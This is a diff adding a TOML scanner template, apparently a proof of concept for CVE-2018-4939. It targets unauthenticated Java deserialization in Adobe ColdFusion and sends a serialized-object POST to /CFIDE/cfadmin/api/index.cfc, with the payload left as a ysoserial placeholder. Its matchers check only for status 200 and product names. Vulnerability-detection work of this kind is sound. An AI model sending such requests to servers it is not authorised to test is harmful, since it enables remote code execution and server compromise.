@@ -1,0 +1,41 @@
+[info]
+author = "ave"
+description = "Adobe ColdFusion 存在不安全反序列化漏洞（CWE-502），攻击者可通过向 /CFIDE/cfadmin/api/index.cfc 发送特制的序列化 Java 对象，在无需身份认证的情况下触发反序列化并执行任意代码。该漏洞影响 Adobe ColdFusion Update 5 及更早版本以及 ColdFusion 11 Update 13 及更早版本，CVSS 评分 9.8（严重级别），攻击条件宽松（网络可达、无需认证、无需用户交互），成功利用后可导致完全入侵受影响服务器。"
+id = "POC-AVE-2018-0777"
+name = "CVE-2018-4939 PoC"
+severity = "critical"
+tags = ["ave-2018-0777"]
+vuln_id = [
+    "CVE-2018-4939",
+    "AVE-2018-0777",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/CFIDE/cfadmin/api/index.cfc"
+protocol = "http"
+
+[poc.requests.body]
+content = "{{ysoserial_payload}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-java-serialized-object"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "coldfusion",
+    "adobe",
+]
